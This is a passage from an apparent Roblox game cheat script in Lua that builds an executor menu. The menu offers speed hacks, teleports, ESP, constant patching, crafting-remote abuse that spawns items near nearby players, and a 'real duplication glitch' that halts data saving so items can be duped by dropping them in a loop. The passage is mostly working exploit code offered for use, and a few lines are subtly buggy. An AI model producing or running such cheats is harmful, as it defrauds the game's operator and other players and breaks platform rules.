                getgenv().RagDollBypass = nil
            end
        end
	end
})

PlayerModificationsSection:CreateKeybind({
    Name = 'QuickSpeed',
    Default = "B",
    Flag = 'QuickSpeed',
    Callback = function(key)
        getgenv().QuickSpeedKey = key
    end,
    KeyPressed = function()
        while UserInputService:IsKeyDown(getgenv().QuickSpeedKey) and not UserInputService:GetFocusedTextBox() do
            task.wait()
            if IsPlayerAlive(LocalPlayer) then
                if LocalPlayer.Character.Humanoid.MoveDirection.Magnitude > 0 then
                    LocalPlayer.Character:TranslateBy(LocalPlayer.Character.Humanoid.MoveDirection * (getgenv().QuickSpeedMultiplier*.50))
                end
            end
        end
    end
})

PlayerModificationsSection:CreateSlider({
    Name = 'QuickSpeed multiplier',
    Min = 1,
	Max = 20,
	Default = 1,
	Digits = 0,
    Flag = 'QuickSpeedMultiplier',
	Callback = function(Value)
		getgenv().QuickSpeedMultiplier = Value
	end     
})

PlayerModificationsSection:CreateSlider({
    Name = 'Swim Speed',
    Min = 10,
	Max = 100,
	Default = 14,
	Digits  = 0,
    Flag = 'SwimSpeed',
	Callback = function(Value)
		local Constants = require(ReplicatedStorage:WaitForChild('References'):WaitForChild('SharedData'):WaitForChild('CONSTANTS'))
		Constants.WALK_SPEEDS.SWIM = Value
	end 
})

PlayerModificationsSection:CreateToggle({
    Name = 'Jump Power',
    Default = false,
    Flag = 'JumpPower',
    Callback = function(Value)
       getgenv().configs.JumpPower = Value 
       JumpPower()
    end
})

PlayerModificationsSection:CreateToggle({
    Name = 'Sneaky Speed',
    Default = false,
    Flag = 'SneakySpeed',
    Callback = function(Value)
        getgenv().configs.ExtraSpeed = Value 
       ExtraSpeed()
    end
})

local MiscModSections = LPlayer:CreateSection('Misc Mods')

MiscModSections:CreateButton({
    Name = 'Get Map Candy(Op)',
    Callback = function()
        function GetCandy()
            for _, candy in pairs(Workspace:GetDescendants()) do
                if candy.Name == 'Candy' then
                    repeat task.wait()
                        local CandyPos = candy:GetPivot().Position
                        if IsPlayerAlive(LocalPlayer) then
                            if candy.Parent then
                                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(CandyPos + Vector3.new(0, 2, 0))
                                RemoteEvents['ItemInteracted']:FireServer(candy, "Pickup")
                            end
                        end
                    until not candy.Parent or not IsPlayerAlive(LocalPlayer)
                end
            end
        end
        GetCandy()
        if not Workspace:FindFirstChild('Candy', true) then
            MakeAtlasNotification('No Candies left/found', 'No candies left in the map', 3)
        end
    end
})

if MyInventory:FindFirstChild("Glider") or MyInventory:FindFirstChild("Easter Glider") then
    MiscModSections:CreateSliderToggle({
        Name = "Mod Glider Speed",
        Min = 30,
        Max = 300,
        SliderDefault = 30,
        Digits = 0,
        ToggleDefault = false,
        SliderFlag = "GliderModSpeed",
        ToggleFlag = "GliderModSpeedToggle",
        SliderCallback = function(Value) 
            getgenv().GliderModSpeed = Value
        end,
        ToggleCallback = function(Value)
            local GliderModule = require(LocalPlayer:WaitForChild('PlayerScripts'):WaitForChild('Main'):WaitForChild('ToolController'):WaitForChild('ToolObject'):WaitForChild('Controllers'):WaitForChild('Glider'))
            if Value == true then
                setconstant(GliderModule.Step, 9, tonumber(getgenv().GliderModSpeed))
            else
                setconstant(GliderModule.Step, 9, 30)
            end
        end
    })
end

MiscModSections:CreateButton({
    Name = 'Restore Candy Mesh(not invisible)',
    Callback = function()
        local CheckPassiveOrNonPassive = Workspace:FindFirstChild("Replicators"):FindFirstChild('NonPassive') and 'NonPassive' or 'Passive'
        for _, candy in pairs(Workspace:GetDescendants()) do
            if candy.Name == 'Candy' and candy:FindFirstChildOfClass('MeshPart') then
                candy.PrimaryPart.MeshId = 'rbxassetid://4018923852'
            end
        end
        if not getgenv().CandyAdded then
            getgenv().CandyAdded = Workspace:WaitForChild('Replicators')[CheckPassiveOrNonPassive].ChildAdded:Connect(function(candie)
                task.wait(0.1)
                if candie.Name == 'Pile of Candy' then
                    for _, multicandy in pairs(candie:FindFirstChildOfClass('Model'):GetChildren()) do
                        multicandy.MeshId = 'rbxassetid://4018923852'
                    end
                elseif candie.Name == 'Candy' and candie:FindFirstChildOfClass('MeshPart') then
                    candie.PrimaryPart.MeshId = 'rbxassetid://4018923852'
                end
            end)
            getgenv().CandyAdded2 = Workspace.ChildAdded:Connect(function(candie)
                task.wait(0.1)
                if candie.Name == 'Candy' and candie:FindFirstChildOfClass('MeshPart') then
                    candie.PrimaryPart.MeshId = 'rbxassetid://4018923852'
                end
            end)
        end
        MakeAtlasNotification('Restored mesh', 'Candies should now be visible', 3)
    end
})

MiscModSections:CreateButton({
    Name = 'Drive in water',
    Callback = function()
        local Cart = require(LocalPlayer:WaitForChild('PlayerScripts'):WaitForChild('Main'):WaitForChild('Vehicle'):WaitForChild('Cart'))
        Cart.TerrainCheck = function()
            return false 
        end
    end
})

MiscModSections:CreateTextBox({
    Name = 'Player Tp',
    DefaultText = '',
    PlaceholderText = 'Username here',
    ClearTextOnFocus = true,
    Flag = 'PlayerTpTextbox',
    Callback = function(Value)
        if Value == "" then return end
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                if string.find(plr.Name:lower(), Value:lower()) or string.find(plr.DisplayName:lower(), Value:lower()) then
                    if IsPlayerAlive(LocalPlayer) and IsPlayerAlive(plr) then
                        local targetpos = plr.Character.HumanoidRootPart.Position
                        local myroot = LocalPlayer.Character.HumanoidRootPart.Position
                        myroot.CFrame = CFrame.new(targetpos)
                        MakeAtlasNotification('Success', 'Tped to: '..plr.Name, 3)
                    end
                end
            end
        end
    end
})

local RealDupeSection = Dupe:CreateSection('Real Duplication Glitch(data does not save)')

RealDupeSection:CreateButton({
    Name = 'Stop data(dupe)',
    Callback = function(Value)
        RemoteEvents['SetSettings']:FireServer(Workspace)
		MakeAtlasNotification('Data Stopped', 'Drop anything you want :)', 5)
    end
})

RealDupeSection:CreateButton({
    Name = 'Rejoin Current Server',
    Callback = function(Value)
		MakeAtlasNotification('Rejoining', 'Rejoining the server', 1)
        TeleportService:Teleport(game.PlaceId, LocalPlayer)
    end
})

RealDupeSection:CreateTextBox({
    Name = 'Loop Item Drop Name:',
    DefaultText = '',
    PlaceholderText = 'Inventory Item',
    ClearTextOnFocus = true,
    Flag = 'RepeatDropInventoryItem',
    Callback = function(args)
        if args == "" then return end
        for _, item in pairs(MyInventory:GetChildren()) do
            if string.find(item.Name:lower(), args:lower()) then
                ItemIndexed = item
                return MakeAtlasNotification('Item Selected:', item.Name, 3)
            else
                ItemIndexed = nil
				ItemIndexedNumber = nil
            end
        end
        return MakeAtlasNotification('Invalid Item', 'Item not found', 3)
    end
})

RealDupeSection:CreateToggle({
    Name = 'Loop Item Drop',
    Default = false,
    Flag = 'LoopDropItem',
    Callback  = function(Value)
        getgenv().configs.AmountToLoopDrop = Value
        if getgenv().configs.AmountToLoopDrop == true then
            if ItemIndexed and ItemIndexed:FindFirstChild('Top'):FindFirstChild('NameLabel') then
                ItemIndexedNumber = ItemIndexed:FindFirstChild('Top'):FindFirstChild('NameLabel').Text:match('%d+')
                repeat task.wait()
                    if IsPlayerAlive(LocalPlayer) then
                        if ItemIndexed.Parent then
                            if ItemIndexed:FindFirstChild('Top'):FindFirstChild('NameLabel').Text:match('%d+') == nil then
                                RemoteEvents['InventoryInteraction']:FireServer(SWITCHEDITEMSTABLE[ItemIndexed.Name], 'Drop')
                            else
                                ItemIndexedNumber = ItemIndexed:FindFirstChild('Top'):FindFirstChild('NameLabel').Text:match('%d+')
                                RemoteEvents['InventoryInteraction']:FireServer(SWITCHEDITEMSTABLE[ItemIndexed.Name], 'Drop')
                            end
                        end
                    end
                until not ItemIndexed.Parent or not getgenv().configs.AmountToLoopDrop or not IsPlayerAlive(LocalPlayer)
            end
        end
    end
})

local RealDupeSection = Dupe:CreateSection('Craft Armor')

RealDupeSection:CreateButton({
    Name = 'Craft Full Soul        	(REQ.  |   40 Soul',
    Callback = function(Value)
        if IsPlayerAlive(LocalPlayer) then
        local function GetClosestTrapPlayer()
            local range = 70
            local closest = nil
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude
                    if plr.Character.Humanoid.MoveDirection.Magnitude > 0 then
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position + plr.Character.HumanoidRootPart.AssemblyLinearVelocity) + Vector3.new(0, 1, 0)
                        end
                    else
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position) + Vector3.new(0, 1, 0)
                        end
                    end
                end
            end
            return closest
        end
        RemoteEvents['CraftItem']:FireServer(201,202,203,204, GetClosestTrapPlayer(), 690)
    end
end
})

RealDupeSection:CreateButton({
    Name = 'Craft Obsidian Armor        	(REQ.  |   40 Obsidian',
    Callback = function(Value)
        if IsPlayerAlive(LocalPlayer) then
        local function GetClosestTrapPlayer()
            local range = 70
            local closest = nil
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude
                    if plr.Character.Humanoid.MoveDirection.Magnitude > 0 then
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position + plr.Character.HumanoidRootPart.AssemblyLinearVelocity) + Vector3.new(0, 1, 0)
                        end
                    else
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position) + Vector3.new(0, 1, 0)
                        end
                    end
                end
            end
            return closest
        end
        RemoteEvents['CraftItem']:FireServer(225,226,227,228, GetClosestTrapPlayer(), 690)
    end
end
})

local RealDupeSection = Dupe:CreateSection('Craft Shields')

RealDupeSection:CreateButton({
    Name = 'Craft Pumpkin Shield        	(REQ.  |   15 Pumpkins',
    Callback = function(Value)
        if IsPlayerAlive(LocalPlayer) then
        local function GetClosestTrapPlayer()
            local range = 70
            local closest = nil
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude
                    if plr.Character.Humanoid.MoveDirection.Magnitude > 0 then
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position + plr.Character.HumanoidRootPart.AssemblyLinearVelocity) + Vector3.new(0, 1, 0)
                        end
                    else
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position) + Vector3.new(0, 1, 0)
                        end
                    end
                end
            end
            return closest
        end
        RemoteEvents['CraftItem']:FireServer(379, GetClosestTrapPlayer(), 690)
    end
end
})

RealDupeSection:CreateButton({
    Name = 'Craft Soul Shield        	(REQ.  |   7 Souls,  3 Stone',
    Callback = function(Value)
        if IsPlayerAlive(LocalPlayer) then
        local function GetClosestTrapPlayer()
            local range = 70
            local closest = nil
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude
                    if plr.Character.Humanoid.MoveDirection.Magnitude > 0 then
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position + plr.Character.HumanoidRootPart.AssemblyLinearVelocity) + Vector3.new(0, 1, 0)
                        end
                    else
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position) + Vector3.new(0, 1, 0)
                        end
                    end
                end
            end
            return closest
        end
        RemoteEvents['CraftItem']:FireServer(218, GetClosestTrapPlayer(), 690)
    end
end
})


local RealDupeSection = Dupe:CreateSection('Spawn Sleigh')

RealDupeSection:CreateButton({
    Name = 'Spawn Sleigh        	(REQ.  |   5 Ruby, 100 Candy) ',
    Callback = function(Value)
        if IsPlayerAlive(LocalPlayer) then
        local function GetClosestTrapPlayer()
            local range = 70
            local closest = nil
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude
                    if plr.Character.Humanoid.MoveDirection.Magnitude > 0 then
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position + plr.Character.HumanoidRootPart.AssemblyLinearVelocity) + Vector3.new(0, 1, 0)
                        end
                    else
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position) + Vector3.new(0, 1, 0)
                        end
                    end
                end
            end
            return closest
        end
        RemoteEvents['CraftItem']:FireServer(183, GetClosestTrapPlayer(), 690)
    end
end
})

RealDupeSection:CreateButton({
    Name = 'Spawn Grinchs Sleigh        	(REQ.  |   6 Coal, 5 Zen, 200 Candy) ',
    Callback = function(Value)
        if IsPlayerAlive(LocalPlayer) then
        local function GetClosestTrapPlayer()
            local range = 70
            local closest = nil
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude
                    if plr.Character.Humanoid.MoveDirection.Magnitude > 0 then
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position + plr.Character.HumanoidRootPart.AssemblyLinearVelocity) + Vector3.new(0, 1, 0)
                        end
                    else
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position) + Vector3.new(0, 1, 0)
                        end
                    end
                end
            end
            return closest
        end
        RemoteEvents['CraftItem']:FireServer(185, GetClosestTrapPlayer(), 690)
    end
end
})

RealDupeSection:CreateButton({
    Name = 'Spawn Pirate Ship        	(REQ.  |   1 Wood) ',
    Callback = function(Value)
        if IsPlayerAlive(LocalPlayer) then
        local function GetClosestTrapPlayer()
            local range = 70
            local closest = nil
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude
                    if plr.Character.Humanoid.MoveDirection.Magnitude > 0 then
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position + plr.Character.HumanoidRootPart.AssemblyLinearVelocity) + Vector3.new(0, 1, 0)
                        end
                    else
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position) + Vector3.new(0, 1, 0)
                        end
                    end
                end
            end
            return closest
        end
        RemoteEvents['CraftItem']:FireServer(221, GetClosestTrapPlayer(), 690)
    end
end
})

RealDupeSection:CreateButton({
    Name = 'Spawn Potion Cauldron        	(REQ.  |   ???) ',
    Callback = function(Value)
        if IsPlayerAlive(LocalPlayer) then
        local function GetClosestTrapPlayer()
            local range = 70
            local closest = nil
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude
                    if plr.Character.Humanoid.MoveDirection.Magnitude > 0 then
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position + plr.Character.HumanoidRootPart.AssemblyLinearVelocity) + Vector3.new(0, 1, 0)
                        end
                    else
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position) + Vector3.new(0, 1, 0)
                        end
                    end
                end
            end
            return closest
        end
        RemoteEvents['CraftItem']:FireServer(371, GetClosestTrapPlayer(), 690)
    end
end
})

local AutoSellSection = AutoSell:CreateSection('AutoSell (This does not account for pet token multipliers)')

AutoSellSection:CreateToggle({
    Name = '4 Silver Bar = 1 Token',
    Default = false,
    Flag = 'SellSilverBar',
    Callback = function(Value)
        _G.SellSilver = Value
        while _G.SellSilver and task.wait(0.5) do
            if _G.SellSilver then
                SellItem('Silver Bar', 4, 14)
            end
        end
    end
})

AutoSellSection:CreateToggle({
    Name = '4 Slime Ball = 1 Token',
    Default = false,
    Flag = 'SellSlimeBall',
    Callback = function(Value)
        _G.SellSlime = Value
        while _G.SellSlime and task.wait(0.5) do
            if _G.SellSlime then
                SellItem('Slime Ball', 40, 15)
            end
        end
    end
})

AutoSellSection:CreateToggle({
    Name = '2 Gold Bar = 1 Token',
    Default = false,
    Flag = 'SellGoldBar',
    Callback = function(Value)
        _G.SellGold = Value
        while _G.SellSlime and task.wait(0.5) do
            if _G.SellSlime then
                SellItem("Gold Bar", 2, 16)
            end
        end
    end
})

AutoSellSection:CreateToggle({
    Name = '1 Ruby = 3 Token',
    Default = false,
    Flag = 'SellRuby',
    Callback = function(Value)
        _G.SellRuby = Value
        while _G.SellRuby and task.wait(0.5) do
            if _G.SellRuby then
                SellItem("Ruby", 1, 17)
            end
        end
    end
})

AutoSellSection:CreateToggle({
    Name = '1 Diamond = 4 Token',
    Default = false,
    Flag = 'SellDiamond',
    Callback = function(Value)
        _G.SellDiamonds = Value
        while _G.SellDiamonds and task.wait(0.5) do
            if _G.SellDiamonds then
                SellItem("Diamond", 1, 18)
            end
        end
    end
})

AutoSellSection:CreateToggle({
    Name = '1 Soul = 5 Token',
    Default = false,
    Flag = 'SellSoul',
    Callback = function(Value)
        _G.SellSouls = Value
        while _G.SellSouls and task.wait(0.5) do
            if _G.SellSouls then
                if getgenv().configs.UseSoulKeys then
                    SellItem("Soul", 11, 22)
                else
                    SellItem("Soul", 1, 22)
                end
            end
        end
    end
})

AutoSellSection:CreateToggle({
    Name = '1 Zenyte = 6 Token',
    Default = false,
    Flag = 'SellZenyte',
    Callback = function(Value)
        _G.SellZenyte = Value
        while _G.SellZenyte and task.wait(0.5) do
            if _G.SellZenyte then
                SellItem("Zenyte", 1, 19)
            end
        end
    end
})

AutoSellSection:CreateToggle({
    Name = '1 Volcanic Ore = 15 Token',
    Default = false,
    Flag = 'SellVolcanicOre',
    Callback = function(Value)
        _G.SellVolcanicOre = Value
        while _G.SellVolcanicOre and task.wait(0.5) do
            if _G.SellVolcanicOre then
                SellItem("Volcanic Ore", 1, 23)
            end
        end
    end
})

AutoSellSection:CreateToggle({
    Name = '1 Obsidian = 20 Token',
    Default = false,
    Flag = 'SellObsidian',
    Callback = function(Value)
        _G.SellObsidian = Value
        while _G.SellObsidian and task.wait(0.5) do
            if _G.SellObsidian then
                SellItem("Obsidian", 1, 24)
            end
        end
    end
})

AutoSellSection:CreateToggle({
    Name = '1 Lunar Ore = 25 Token',
    Default = false,
    Flag = 'SellLunar',
    Callback = function(Value)
        _G.SellLunarOre = Value
        while _G.SellLunarOre and task.wait(0.5) do
            if _G.SellLunarOre then
                SellItem("Lunar Ore", 1, 25)
            end
        end
    end
})

AutoSellSection:CreateToggle({
    Name = '1 Moonstone = 30 Token',
    Default = false,
    Flag = 'SellMoonstone',
    Callback = function(Value)
        _G.SellMoonstone = Value
        while _G.SellMoonstone and task.wait(0.5) do
            if _G.SellMoonstone then
                SellItem("Moonstone", 1, 26)
            end
        end
    end
})

local ArmorTraderSection = AutoSell:CreateSection('Armor Trader')

ArmorTraderSection:CreateButton({
    Name = 'Ruby Shield = 50 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 27)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Diamond Shield = 100 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 28)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Zenyte Shield = 150 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 29)
    end
})


ArmorTraderSection:CreateButton({
    Name = 'Obsidian Shield = 350 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 30)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Ruby Helmet = 15 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 31)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Ruby Body = 15 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 32)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Ruby Legs = 15 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 33)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Ruby Boots = 15 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 34)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Diamond Helmet = 27 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 35)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Diamond Body = 27 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 36)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Diamond Legs = 27 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 37)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Diamond Boots = 27 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 38)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Zenyte Helmet = 45 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 39)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Zenyte Body = 45 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 40)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Zenyte Legs = 45 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 41)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Zenyte Boots = 45 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 42)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Obsidian Helmet = 115 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 43)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Obsidian Body = 115 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 44)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Obsidian Legs = 115 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 45)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Obsidian Boots = 115 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 46)
    end
})


ArmorTraderSection:CreateButton({
    Name = 'Moostone Helmet = 175 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 47)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Moostone Body = 175 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 48)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Moostone Legs = 175 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 49)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Moostone Boots = 175 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 50)
    end
})

ArmorTraderSection:CreateButton({
    Name = 'Springy Boots',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 51)
    end
})

local WeaponTraderSection = AutoSell:CreateSection('Weapon Trader')

WeaponTraderSection:CreateButton({
    Name = 'Silver Sword = 1 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 11)
    end
})

WeaponTraderSection:CreateButton({
    Name = 'Gold Sword = 2 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 12)
    end
})

WeaponTraderSection:CreateButton({
    Name = 'Gold Bow = 3 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 13)
    end
})

WeaponTraderSection:CreateButton({
    Name = 'Ruby Sword = 10 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 14)
    end
})

WeaponTraderSection:CreateButton({
    Name = 'Diamond Sword = 18 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 15)
    end
})

WeaponTraderSection:CreateButton({
    Name = 'Zenyte Sword = 30 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 17)
    end
})

WeaponTraderSection:CreateButton({
    Name = 'Diamond Crossbow = 36 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 16)
    end
})

WeaponTraderSection:CreateButton({
    Name = 'Zenyte Crossbow = 45 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 18)
    end
})

WeaponTraderSection:CreateButton({
    Name = 'Obsidian Club = 80 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 19)
    end
})

WeaponTraderSection:CreateButton({
    Name = 'Moonstone Sword = 130 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 20)
    end
})

local EspSection = Visuals:CreateSection('Esp')

EspSection:CreateToggle({
    Name = "Esp",
    Default = false,
    Flag = 'PlayerEsp',
    Callback = function(Value)
        getgenv().configs.PlayerEsp = Value
        PlayerEsp()
    end
})

local VisualsSection = Visuals:CreateSection('Visuals')

VisualsSection:CreateSliderToggle({
	Name = "Time Of Day",
	Min = 0.1,
	Max = 24,
    Digits = 1,
	SliderDefault = Lighting.ClockTime,
    ToggleDefault = false,
    SliderFlag = 'TimeOfDay',
    ToggleFlag = 'ToggleTimeOfDay',
    SliderCallback = function(Value)
        _G.ClockTime = Value
    end,
	ToggleCallback = function(Value)
        if _G.ClockTime then
            Lighting.ClockTime = _G.ClockTime
            _G.ClockTimeChanged = Value
            if not ClockTimeChanged and _G.ClockTimeChanged then
                ClockTimeChanged = Lighting.Changed:Connect(function(clock)
                    if not _G.ClockTimeChanged then
                        ClockTimeChanged:Disconnect()
                        ClockTimeChanged = nil
                    end
                    if clock == 'ClockTime' then
                        Lighting.ClockTime = _G.ClockTime
                    end
                end)
            else
                if ClockTimeChanged then
                    ClockTimeChanged:Disconnect()
                    ClockTimeChanged = nil
                end
            end
        end
	end    
})

VisualsSection:CreateSliderToggle({
	Name = "Brightness",
	Min = 0.1,
	Max = 15,
    Digits = 1,
	SliderDefault = Lighting.Brightness,
    ToggleDefault = false,
    SliderFlag = 'Brightness',
    ToggleFlag = 'ToggleBrightness',
    SliderCallback = function(Value)
        _G.Brightness = Value
    end,
	ToggleCallback = function(Value)
        if _G.Brightness then
            Lighting.Brightness = _G.Brightness
            _G.BrightnessChanged = Value
            if not BrightnessChanged and _G.BrightnessChanged then
                BrightnessChanged = Lighting.Changed:Connect(function(clock)
                    if not _G.BrightnessChanged then
                        BrightnessChanged:Disconnect()
                        BrightnessChanged = nil
                    end
                    if clock == 'Brightness' then
                        Lighting.Brightness = _G.Brightness
                    end
                end)
            else
                if BrightnessChanged then
                    BrightnessChanged:Disconnect()
                    BrightnessChanged = nil
                end
            end
        end
	end    
})

VisualsSection:CreateSliderToggle({
	Name = "Saturation",
	Min = 0.1,
	Max = 3,
    Digits = 1,
	SliderDefault = Lighting:WaitForChild('ColorCorrection').Saturation,
    ToggleDefault = false,
    SliderFlag = 'Saturation',
    ToggleFlag = 'ToggleSaturation',
    SliderCallback = function(Value)
        _G.Saturation = Value
    end,
	ToggleCallback = function(Value)
        if _G.Saturation then
            Lighting:WaitForChild('ColorCorrection').Saturation = _G.Saturation
        end
	end    
})

VisualsSection:CreateSliderToggle({
	Name = "Contrast",
	Min = 0.1,
	Max = 3,
    Digits = 1,
	SliderDefault = Lighting:WaitForChild('ColorCorrection').Contrast,
    ToggleDefault = false,
    SliderFlag = 'Contrast',
    ToggleFlag = 'ToggleContrast',
    SliderCallback = function(Value)
        _G.Contrast = Value
    end,
	ToggleCallback = function(Value)
        if _G.Contrast then
            Lighting:WaitForChild('ColorCorrection').Contrast = _G.Contrast
        end
	end    
})

VisualsSection:CreateSliderToggle({
	Name = "Fog End",
	Min = 0.1,
	Max = 15,
    Digits = 1,
	SliderDefault = Lighting:WaitForChild('Atmosphere').Density,
    ToggleDefault = false,
    SliderFlag = 'FogEnd',
    ToggleFlag = 'ToggleFogEnd',
    SliderCallback = function(Value)
        _G.FogEnd = Value
    end,
	ToggleCallback = function(Value)
        if _G.FogEnd then
            Lighting:WaitForChild('Atmosphere').Density = _G.FogEnd
            _G.FogEndChanged = Value
            if not FogEndChanged and _G.FogEndChanged then
                FogEndChanged = Lighting.Changed:Connect(function(clock)
                    if not _G.FogEndChanged then
                        FogEndChanged:Disconnect()
                        FogEndChanged = nil
                    end
                    if clock == 'Fog End' then
                        Lighting:WaitForChild('Atmosphere').Density = _G.FogEnd
                    end
                end)
            else
                if FogEndChanged then
                    FogEndChanged:Disconnect()
                    FogEndChanged = nil
                end
            end
        end
	end    
})

VisualsSection:CreateSliderToggle({
	Name = "Contrast",
	Min = 0,
	Max = 31,
    Digits = 1,
	SliderDefault = Workspace:WaitForChild('Terrain').WaterTransparency,
    ToggleDefault = false,
    SliderFlag = 'WaterTransparency',
    ToggleFlag = 'ToggleWaterTransparency',
    SliderCallback = function(Value)
        _G.WaterTransparency = Value
    end,
	ToggleCallback = function(Value)
        if _G.WaterTransparency then
            Workspace:WaitForChild('Terrain').WaterTransparency = _G.WaterTransparency
        end
	end    
})

VisualsSection:CreateColorPicker({
    Name = 'Water Color',
